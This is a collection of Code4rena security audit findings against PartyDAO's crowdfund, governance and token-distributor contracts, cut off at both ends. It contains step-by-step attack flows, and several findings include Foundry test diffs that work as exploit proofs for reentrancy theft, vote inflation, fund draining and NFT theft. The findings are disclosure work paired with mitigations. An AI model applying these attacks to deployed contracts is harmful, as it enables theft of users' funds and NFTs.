Recommended Mitigation Steps At the end of _executeArbitraryCalls function, refund the remaining ethAvailable back to the user
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149   # Vulnerability details  ## Impact AuctionCrowdfund contract is designed in a way to allow bidding max upto maximumBid. But due to a flaw, anyone (including NFT seller) can make sure that CrowdFund bid always remain equal to maximumBid thus removing the purpose of maximumBid. This also causes loss to Party participating in this Auction as the auction will always end up with maximumBid even when it could have stopped with lower bid as shown in POC  ## Proof of Concept 1. An auction is started for NFT N in the market 2. Party Users P1 starts an AuctionCrowdfund with maximumBid as 100 for this auction.  ``` function initialize(AuctionCrowdfundOptions memory opts)         external         payable         onlyConstructor     { ... maximumBid = opts.maximumBid; ... } ```  3. P1 bids amount 10 for the NFT N using [bid function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149) 4. Some bad news arrives for the NFT collection including NFT N reducing its price 5. P1 decides not to bid more than amount 10 due to this news 6. NFT collection owner who is watching this AuctionCrowdfund observes that bidding is only 10 but Party users have maximumBid of 100 7. NFT collection owner  asks his friend to bid on this NFT in the auction market (different from crowd fund) 8. NFT collection owner now takes advantage of same and himself calls the bid function of AuctionCrowdfund via Proxy  ``` function bid() external onlyDelegateCall { ... } ```  9. Now since last bid belongs to collection owner friend, so AuctionCrowdfund contract simply extends its bid further   ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         }         // Get the minimum necessary bid to be the highest bidder.         uint96 bidAmount = market.getMinimumBid(auctionId_).safeCastUint256ToUint96();         // Make sure the bid is less than the maximum bid.         if (bidAmount > maximumBid) {             revert ExceedsMaximumBidError(bidAmount, maximumBid);         }         lastBid = bidAmount; ```  10. NFT collection owner keeps repeating step 7-9 until AuctionCrowdfund reaches the final maximum bid of 100 11. After auction completes, collection owner gets 100 amount instead of 10 even though crowd fund users never bidded for amount 100  ## Recommended Mitigation Steps maximumbid concept can easily be bypassed as shown above and will not make sense. Either remove it completely    OR bid function should only be callable via crowdfund members then attacker would be afraid if new bid will come or not and there should be a consensus between crowdfund members before bidding which will protect this scenario
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/fatherOfBlocks-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L183-L202   # Vulnerability details  Note: PartyDAO acknowledges that "canceling an InProgress proposal (mid-step) can leave the governance party in a vulnerable or undesirable state because there is no cleanup logic run during a cancel" in the "Known Issues / Topics" section of the contest readme. I still believe that this vulnerability needs to be mitigated as it can directly lead to loss of user funds.  ## Impact  Majority vote can abuse cancel functionality to steal an NFT owned by the party  ## Proof of Concept  ArbitraryCallsProposal.sol implements the following safeguards for arbitrary proposals that are not unanimous:  1. Prevents the ownership of any NFT changing during the call. It does this by checking the the ownership of all NFTs before and after the call.  2. Prevents calls that would change the approval status of any NFT. This is done by disallowing the "approve" and "setApprovalForAll" function selectors.  Additionally ListOnOpenseaProposal.sol implements the following safeguards:  1. NFTs are first listed for auction on Zora so that if they are listed for a very low price then the auction will keep them from being purchased at such a low price  2. At the end of the auction the approval is revoked when _cleanUpListing is called  These safeguards are ultimately ineffective though. The majority could use the following steps to steal the NFT:  1. Create ListOnOpenseaProposal with high sell price and short cancel delay  2. Vote to approve proposal with majority vote  3. Execute first step of proposal, listing NFT on Zora auction for high price  4. Wait for Zora auction to end since the auction price is so high that no one will buy it  5. Execute next step, listing the NFT on Opensea. During this step the contract grants approval of the NFT to the Opensea contract  6. Wait for cancelDelay to expire  7. Call PartyGovernance.sol#cancel. This will immediately terminate the Opensea bypassing _cleanUpListing and keeping the approval to the Opensea contract  8. Create ArbitraryCallsProposal.sol that lists the NFT on Opensea for virtually nothing. Since only approval selectors have been blacklisted and the NFT does not change ownership, the proposal does not need to be unanimous to execute.  9. Approve proposal and execute  10. Buy NFT  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  When a proposal is canceled, it should call a proposal specific function that makes sure everything is cleaned up. NFTs delisted, approvals revoked, etc.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242   # Vulnerability details  ## Impact In the finalize function of the AuctionCrowdfund contract, when the contract gets NFT and lastBid_ == 0, it is considered that NFT is gifted to the contract and everyone who contributed wins. ```         if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions; ``` But if the contract was bid before the NFT was gifted to the contract, then since lastBid_ ! = 0, only the user who contributed at the beginning will win. ## Proof of Concept https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L149-L175 ## Tools Used None ## Recommended Mitigation Steps Whether or not NFT is free to get should be determined using whether the contract balance is greater than totalContributions
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/R2-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L131 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L386   # Vulnerability details  ## Impact `TokenDistributor.createERC20Distribution` can be used to create token distributions for ERC777 tokens (which are backwards-compatible with ERC20). However, this introduces a reentrancy vulnerability which allows a party to get the tokens of another party. The problem is the `tokensToSend` hook which is executed BEFORE balance updates happens (see https://eips.ethereum.org/EIPS/eip-777). When this hook is executed, `token.balanceOf(address(this))` therefore still returns the old value, but `_storedBalances[balanceID]` was already decreased.  ## Proof Of Concept Party A and Party B have a balance of 1,000,000 tokens (of some arbitrary ERC777 token) in the distributor. Let's say for the sake of simplicity that both parties only have one user (user A in party A, user B in party B). User A (or rather his smart contract) performs the following attack: - He calls `claim`, which transfers 1,000,000 tokens to his contract address. In `_transfer`, `_storedBalances[balanceId]` is decreased by 1,000,000 and therefore now has a value of 1,000,000. - In the `tokensToSend` hook, he initiates another distribution for his party A by calling `PartyGovernance.distribute` which calls `TokenDistributor.createERC20Distribution` (we assume for the sake of simplicity that the party does not have more of these tokens, so the call transfers 0 tokens to the distributor). `TokenDistributor.createERC20Distribution` passes `token.balanceOf(address(this))` to `_createDistribution`. Note that this is still 2,000,000 because we are in the `tokensToSend` hook. - The supply of this distribution is calculated as `(args.currentTokenBalance - _storedBalances[balanceId]) = 2,000,000 - 1,000,000 = 1,000,000`. - When the `tokensToSend` hook is exited (and the first transfer has finished), he can retrieve the tokens of the second distribution (that was created in the hook) to steal the 1,000,000 tokens of party B.  ## Recommended Mitigation Steps Do not allow reentrancy in these functions.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L594   # Vulnerability details  ## Impact `PartyGovernanceNFT` uses the voting power at the time of proposal when calling `accept`. The problem with that is that a user can vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created.  This can also be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously.   The consequences of this are very severe. Any user (no matter how small his voting power is) can propose and pass arbitrary proposals animously and therefore steal all assets (including the precious tokens) out of the party.  ## Proof Of Concept This diff shows how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that he owns and voting from that one: ```diff --- a/sol-tests/party/PartyGovernanceUnit.t.sol +++ b/sol-tests/party/PartyGovernanceUnit.t.sol @@ -762,6 +762,7 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          TestablePartyGovernance gov =              _createGovernance(100e18, preciousTokens, preciousTokenIds);          address undelegatedVoter = _randomAddress(); +        address recipient = _randomAddress();          // undelegatedVoter has 50/100 intrinsic VP (delegated to no one/self)          gov.rawAdjustVotingPower(undelegatedVoter, 50e18, address(0));   @@ -772,38 +773,13 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          // Undelegated voter submits proposal.          vm.prank(undelegatedVoter);          assertEq(gov.propose(proposal, 0), proposalId); - -        // Try to execute proposal (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            "", -            "" -        ); - -        // Skip past execution delay. -        skip(defaultGovernanceOpts.executionDelay); -        // Try again (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            "", -            "" -        ); +        (, PartyGovernance.ProposalStateValues memory valuesPrev) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesPrev.votes, 50e18); +        gov.transferVotingPower(undelegatedVoter, recipient, 50e18); //Simulate NFT transfer +        vm.prank(recipient); +        gov.accept(proposalId, 0); +        (, PartyGovernance.ProposalStateValues memory valuesAfter) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesAfter.votes, 100e18);      } ```  ## Recommended Mitigation Steps You should query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L147   # Vulnerability details  ## Impact If `opts.initialContributor` is set to `address(0)` (and `opts.initialDelegate` is not), there are two problems: 1.) If the crowdfund succeeds, the initial balance will be lost. It is still accredited to `address(0)`, but it is not retrievable.  2.) If the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This will always succeed because `CrowdfundNFT._burn` can be called multiple times for `address(0)`. Every call will cause the initial balance to be burned (transferred to `address(0)`).  Issue 1 is somewhat problematic, but issue 2 is very problematic, because all funds of a crowdfund are burned and an attacker can specifically set up such a deployment (and the user would not notice anything special, after all these are parameters that the protocol accepts).  ## Proof Of Concept This diff illustrates scenario 2, i.e. where a malicious deployer burns all contributions (1 ETH) of `contributor`. He loses 0.25ETH for the attack, but this could be reduced significantly (with more `burn(payable(address(0)))` calls:  ```diff --- a/sol-tests/crowdfund/BuyCrowdfund.t.sol +++ b/sol-tests/crowdfund/BuyCrowdfund.t.sol @@ -36,9 +36,9 @@ contract BuyCrowdfundTest is Test, TestUtils {      string defaultSymbol = 'PBID';      uint40 defaultDuration = 60 * 60;      uint96 defaultMaxPrice = 10e18; -    address payable defaultSplitRecipient = payable(0); +    address payable defaultSplitRecipient = payable(address(this));      uint16 defaultSplitBps = 0.1e4; -    address defaultInitialDelegate; +    address defaultInitialDelegate = address(this);      IGateKeeper defaultGateKeeper;      bytes12 defaultGateKeeperId;      Crowdfund.FixedGovernanceOpts defaultGovernanceOpts; @@ -78,7 +78,7 @@ contract BuyCrowdfundTest is Test, TestUtils {                      maximumPrice: defaultMaxPrice,                      splitRecipient: defaultSplitRecipient,                      splitBps: defaultSplitBps, -                    initialContributor: address(this), +                    initialContributor: address(0),                      initialDelegate: defaultInitialDelegate,                      gateKeeper: defaultGateKeeper,                      gateKeeperId: defaultGateKeeperId, @@ -111,40 +111,26 @@ contract BuyCrowdfundTest is Test, TestUtils {      function testHappyPath() public {          uint256 tokenId = erc721Vault.mint();          // Create a BuyCrowdfund instance. -        BuyCrowdfund pb = _createCrowdfund(tokenId, 0); +        BuyCrowdfund pb = _createCrowdfund(tokenId, 0.25e18);          // Contribute and delegate.          address payable contributor = _randomAddress();          address delegate = _randomAddress();          vm.deal(contributor, 1e18);          vm.prank(contributor);          pb.contribute{ value: contributor.balance }(delegate, ""); -        // Buy the token. -        vm.expectEmit(false, false, false, true); -        emit MockPartyFactoryCreateParty( -            address(pb), -            address(pb), -            _createExpectedPartyOptions(0.5e18), -            _toERC721Array(erc721Vault.token()), -            _toUint256Array(tokenId) -        ); -        Party party_ = pb.buy( -            payable(address(erc721Vault)), -            0.5e18, -            abi.encodeCall(erc721Vault.claim, (tokenId)), -            defaultGovernanceOpts -        ); -        assertEq(address(party), address(party_)); -        // Burn contributor's NFT, mock minting governance tokens and returning -        // unused contribution. -        vm.expectEmit(false, false, false, true); -        emit MockMint( -            address(pb), -            contributor, -            0.5e18, -            delegate -        ); -        pb.burn(contributor); -        assertEq(contributor.balance, 0.5e18); +        vm.warp(block.timestamp + defaultDuration + 1); +        // The auction was not won, we can now burn all ETH from contributor... +        assertEq(address(pb).balance, 1.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 1e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.75e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.5e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0); ```  ## Recommended Mitigation Steps Do not allow an initial contribution when `opts.initialContributor` is not set.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Lambda-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Lambda-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/bulej93-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/rvierdiiev-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171   # Vulnerability details       burn() allows for previously recorded delegate to set himself to be contributor's delegate even if another one was already chosen.  This can be quite material as owner choice for the whole voting power is being reset this way to favor the old delegate.  ## Proof of Concept  _burn() can be invoked by anyone on the behalf of any `contributor`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171  ```solidity     function burn(address payable contributor)         public     {         return _burn(contributor, getCrowdfundLifecycle(), party);     } ```  It mints the governance NFT for the contributor whenever he has voting power:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L471-L485  ```solidity         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         } ```  Now mint() calls _adjustVotingPower() with a new delegate, redirecting all the intristic power, not just one for that id, ignoring the delegation the `owner` might already have:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower;         _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate);         _mint(owner, tokenId);     } ```  I.e. Bob the contributor can take part in the crowdfunding with contribute() with small `0.01 ETH` stake, stating Mike as the delegate of his choice with `contribute(Mike, ...)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L189-L208  ```solidity     /// @param delegate The address to delegate to for the governance phase.     /// @param gateData Data to pass to the gatekeeper to prove eligibility.     function contribute(address delegate, bytes memory gateData)         public         payable     {         _contribute(             msg.sender,             msg.value.safeCastUint256ToUint96(),             delegate,             // We cannot use `address(this).balance - msg.value` as the previous             // total contributions in case someone forces (suicides) ETH into this             // contract. This wouldn't be such a big deal for open crowdfunds             // but private ones (protected by a gatekeeper) could be griefed             // because it would ultimately result in governance power that             // is unattributed/unclaimable, meaning that party will never be             // able to reach 100% consensus.             totalContributions,             gateData         ); ```  Then crowdfund was a success, party was created, and Melany, who also participated, per off-chain arrangement has transferred to Bob a `tokenId` with big voting power (say it is `100 ETH` and the majority of voting power):  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L146-L155  ```solidity     /// @inheritdoc ERC721     function safeTransferFrom(address owner, address to, uint256 tokenId)         public         override         onlyDelegateCall     {         // Transfer voting along with token.         _transferVotingPower(owner, to, votingPowerByTokenId[tokenId]);         super.safeTransferFrom(owner, to, tokenId);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L879-L887  ```solidity     // Transfers some voting power of `from` to `to`. The total voting power of     // their respective delegates will be updated as well.     function _transferVotingPower(address from, address to, uint256 power)         internal     {         int192 powerI192 = power.safeCastUint256ToInt192();         _adjustVotingPower(from, -powerI192, address(0));         _adjustVotingPower(to, powerI192, address(0));     } ```  Bob don't care about his early small contribution and focuses on managing the one that Melany transferred instead as he simply don't need the voting power from the initial `0.01 ETH` contribution anymore.  The actual delegate for Bob at the moment is Linda, while his business with Mike is over. So Bob sets her address there, calling `delegateVotingPower(Linda)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L448-L454  ```solidity     /// @notice Pledge your intrinsic voting power to a new delegate, removing it from     ///         the old one (if any).     /// @param delegate The address to delegating voting power to.     function delegateVotingPower(address delegate) external onlyDelegateCall {         _adjustVotingPower(msg.sender, 0, delegate);         emit VotingPowerDelegated(msg.sender, delegate);     } ```  Now, Mike can unilaterally delegate to himself the whole voting power with `burn(Bob)` as mint() just resets the delegation with the previously recorded value with `_adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate)`.  ## Recommended Mitigation Steps  The issue is that mint() always assumes that it is the first operation for the `owner`, which might not always be the case.  Consider not changing the delegate on `mint` if one is set already:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower; +       address actualDelegate = <get_current_delegate>; +       if (actualDelegate == address(0)) actualDelegate = delegate; -       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate); +       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), actualDelegate);         _mint(owner, tokenId);     } ```  More complicated version might be the one with tracking the most recent request via contribute()/delegateVotingPower() calls timestamps. Here we assume that the delegateVotingPower() holds more information as in the majority of practical cases it occurs after initial contribute() and it is a direct voluntary call from the owner.   
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/indijanc-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/m_Rassska-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Ch_301-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L114-L135   # Vulnerability details  ## Description Voting power is distributed to crowdfund contributors according to the amount contributed divided by NFT purchase price. Attacker can call the buy() function of BuyCrowdfund / CollectionBuyCrowdfund, and use only the first X amount of contribution from the crowdfund, such that attacker's contribution > X/2. He will pass his contract to the buy call, which will receive X and will need to add some additional funds, to purchase the NFT. If the purchase is successful, attacker will have majority rule in the created party. If the party does not do anything malicious, this is a losing move for attacker, because the funds they added on top of X to compensate for the NFT price will eventually be split between group members. However, with majority rule there are various different exploitation vectors attacker may use to steal the NFT from the party ( detailed in separate reports). Because it is accepted that single actor majority is dangerous, but without additional vulnerabilities attacker cannot take ownership of the party's assets, I classify this as a medium. The point is that users were not aware they could become minority under this attack flow.   ## Impact Early contributor can always become majority of crowdfund leading to rugging risks.  ## Proof of Concept 1. Victim A opens BuyCrowdfund and deposits 20 ETH 2. Attacker deposits 30 ETH 3. Victim B deposits 50 ETH 4. Suppose NFT costs 100 ETH 5. Attacker will call buy(), requesting 59ETH buy price. His contract will add 41 additional ETH and buy the NFT. 6. Voting power distributed will be: 20 / 59 for Victim A, 30 / 59 for Attacker, 9 / 59 for Victim B. Attacker has majority. 7. User can use some majority attack to take control of the NFT, netting 100 (NFT value) - 41 (external contribution) - 30 (own contribution) = 29 ETH    ## Tools Used Manual audit.  ## Recommended Mitigation Steps Add a Crowdfund property called minimumPrice, which will be visible to all. Buy() function should not accept NFT price < minimumPrice. Users now have assurances that are not susceptible to majority rule if they deposited enough ETH below the minimumPrice.  
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L116 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/FractionalizeProposal.sol#L54-L62   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. Majority cannot exfiltrate the ETH gained from selling precious NFT via any proposal, and it's impossible to sell NFT for any asset except ETH. If the party were to be compensated via an ERC20 token, majority could pass an ArbitraryCallsProposal to transfer these tokens to an attacker wallet. Unfortunately, FractionalizeProposal is vulnerable to this attack. Attacker/s could pass two proposals and wait for them to be ready for execution. Firstly, a FractionalizeProposal to fractionalize the NFT and mint totalVotingPower amount of ERC20 tokens of the created vault. Secondly, an ArbitraryCallsProposal to transfer the entire ERC20 token supply to an attacker address. At this point, attacker can call vault.redeem() to burn the outstanding token supply and receive the NFT back.  ## Impact A 51% majority could steal the precious NFT from the party and leave it empty.  ## Proof of Concept The only non-trivial component of this attack is that the created vault, whose tokens we wish to transfer out, has an undetermined address until VAULT_FACTORY.mint() is called, which creates it. The opcode which creates the vault contract is CREATE, which calculates the address with ```keccak256(VAULT_FACTORY, nonce)```. Nonce will keep changing while new, unrelated NFTs are fractionalized. The attack needs to prepare both FractionalizedProposal and ArbitraryCallsProposal ahead of time, so that they could be chained immediately, meaning there would be no time for other members to call distribute() on the party, which would store the fractionalized tokens safely in the distributor. In order to solve this chicken and the egg problem, we will use a technique taken from traditional low-level exploitation called heap feng shui.   Firstly, calculate off-chain, the rate new NFTs are fractionalized, and multiple by a safety factor (like 1.2X), and multiply again by the proposal execution delay. This number, added to the current VAULT_FACTORY nonce, will be our target_nonce. Calculate ```target_vault = keccak256(VAULT_FACTORY, target_nonce)```, ```before_target_vault = keccak256(VAULT_FACTORY, target_nonce-1)```  Firstly, we will create a contract which has an attack function that: 1. Loop while before_target_vault != created_vault:  • Mint new dummy attacker_NFT  • created_vault = VAULT_FACTORY.mint(attacker_NFT…) 2. Call execute() on the FractionalizedProposal  // We will feed the execute() parameters to the contract in a separate contract setter. Note that this is guaranteed to create target_vault on the correct address. 3. Call execute() on the ArbitraryCallsProposal  Then, we propose the two proposals: 1. Propose a FractionalizedProposal, with any list price and the precious NFT as parameter 2. Propose an ArbitraryCallsProposal, with target = target_vault, data = transfer(ATTACKER, totalVotingPower)  Then, we set the execute() parameters passed in step 2 and 3 of the attack contract using the proposalID allocated for them.   Then, we wait for execution delay to finish.  Finally, run the attack() function prepared earlier. This will increment the VAULT_FACTORY nonce until it is the one we count on during the ArbitraryCallsProposal. Pass enough gas to be able to burn enough nonces.  At this point, attacker has all the vault tokens, so he may call vault.redeem() and receive the precious NFT.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps 1. Enforce a minimum cooldown between proposals. This will mitigate additional weaknesses of the proposal structure. Here, this will give users the opportunity to call distribute() to put the vault tokens safe in distributor. 2. A specific fix here would be to call distribute() at the end of FractionalizeProposal so that there is no window to steal the funds.  
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/CertoraInc-G.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ListOnZoraProposal.sol#L176-L183   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. One of the main protections is that before listing the NFT on Opensea for a proposal-supplied price, it must first try to be auctioned off on Zora. To move from Zora stage to Opensea stage, _settleZoraAuction() is called when executing ListedOnZora step in ListOnOpenseaProposal.sol. If the function returns false, the next step is executed which lists the item on Opensea. It is assumed that if majority attack proposal reaches this stage, it can steal the NFT for free, because it can list the item for negligible price and immediately purchase it from a contract that executes the Opensea proposal.   Indeed, attacker can always make settleZoraAuction() return false. Looking at  the code: ``` try ZORA.endAuction(auctionId) {             // Check whether auction cancelled due to a failed transfer during             // settlement by seeing if we now possess the NFT.             if (token.safeOwnerOf(tokenId) == address(this)) {                 emit ZoraAuctionFailed(auctionId);                 return false;             }         } catch (bytes memory errData) { ``` As the comment already hints, an auction can be cancelled if the NFT transfer to the bidder fails. This is the relevant AuctionHouse code (endAuction): ``` {             // transfer the token to the winner and pay out the participants below             try IERC721(auctions[auctionId].tokenContract).safeTransferFrom(address(this), auctions[auctionId].bidder, auctions[auctionId].tokenId) {} catch {                 _handleOutgoingBid(auctions[auctionId].bidder, auctions[auctionId].amount, auctions[auctionId].auctionCurrency);                 _cancelAuction(auctionId);                 return;  } ``` As most NFTs inherit from OpenZeppelin's ERC721.sol code, safeTransferFrom will run: ```     function _safeTransfer(         address from,         address to,         uint256 tokenId,         bytes memory data     ) internal virtual {         _transfer(from, to, tokenId);         require(_checkOnERC721Received(from, to, tokenId, data), "ERC721: transfer to non ERC721Receiver implementer");     } ``` So, attacker can bid a very high amount on the NFT to ensure it is the winning bid. When AuctionHouse tries to send the NFT to attacker, the safeTransferFrom will fail because attack will not implement an ERC721Receiver. This will force the AuctionHouse to return the bid amount to the bidder and cancel the auction. Importantly, it will lead to a graceful return from endAuction(), which will make settleZoraAuction() return false and progress to the OpenSea stage.  ## Impact A majority attack can easily bypass Zora auction stage and steal the NFT from the party.  ## Proof of Concept 1. Pass a ListOnOpenseaProposal with a tiny list price and execute it 2. Create an attacker contract which bids on the NFT an overpriced amount, but does not implement ERC721Receiver. Call its bid() function 3. Wait for the auction to end ( timeout after the bid() call) 4. Create a contract with a function which calls execute() on the proposal and immediately buys the item on Seaport. Call the attack function.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps _settleZoraAuction is called from both ListOnZoraProposal and ListOnOpenseaProposal. If the auction was cancelled due to a failed transfer, as is described in the comment, we would like to handle it differently for each proposal type. For ListOnZoraProposal, it should indeed return false, in order to finish executing the proposal and not to hang the engine. For ListOnOpenseaProposal, the desired behavior is to *revert* in the case of a failed transfer. This is because the next stage is risky and defense against the mentioned attack is required. Therefore, pass a revertOnFail flag to _settleZoraAuction, which will be used like so: ``` // Check whether auction cancelled due to a failed transfer during // settlement by seeing if we now possess the NFT. if (token.safeOwnerOf(tokenId) == address(this)) {  if (revertOnFail) {   revert("Zora auction failed because of transfer to bidder")  }            emit ZoraAuctionFailed(auctionId);            return false; } ```   
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/delfin454000-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L275 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L325 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L26   # Vulnerability details    At 2 places in the code only part of the output of `keccak256()` is used as the hash: * At `TokenDistributor` - `DistributionState.distributionHash15` - uses only a 15 bytes as a hash     * This one is intended to save storage * At `Crowdfund.governanceOptsHash` a 16 bytes is used as hash     * This one has no benefit at all as it doesn't save on storage   15/16 bytes hash is already not very high to begin with (as explained below). On top of that, using a non standard hash can be unsafe. Since diverging from the standard can break things.    ## Impact   For the `FixedGovernanceOpts` an attacker can create a legitimate party, and then when running `buy()` use the malicious hash to: * include himself in the hosts (DoS-ing the party by vetoing every vote) * reduce the `passThresholdBps` (allowing him to pass any vote, including sending funds from the Party) * Setting himself as `feeRecipient` and increasing the fee   For the `DistributionInfo` struct - an attacker can easily drain all funds from the token distribution contract, by using the legitimate hash to create a distribution with a malicious ERC20 token (and a malicious party contract), and then using the malicious hash to claim assets of a legitimate token.  ## Proof of Concept  ### The attack   Using the birthday attack, for a 50% chance with a 15 bytes hash, the number of hashes needed to generate is 1.4e18 (`(ln(1/0.5) *2) ** 0.5 * (2 ** 60)`). * For 16 bytes that would be 2.2e19  An attacker can create 2 different structs, a legitimate and a malicious one, while modifying at each iteration only the last bits * For the `FixedGovernanceOpts` the last bits would be the `feeRecipient` field * For the `DistributionInfo` struct that would be the `fee` field (and then exploit it via the `claim()` function which doesn't validate the `fee` field)  The attacker will than generate half of the hashes from the malicious one, and half from the legitimate ones, so in case of a collision there's a 50% chance it'd be between the legitimate 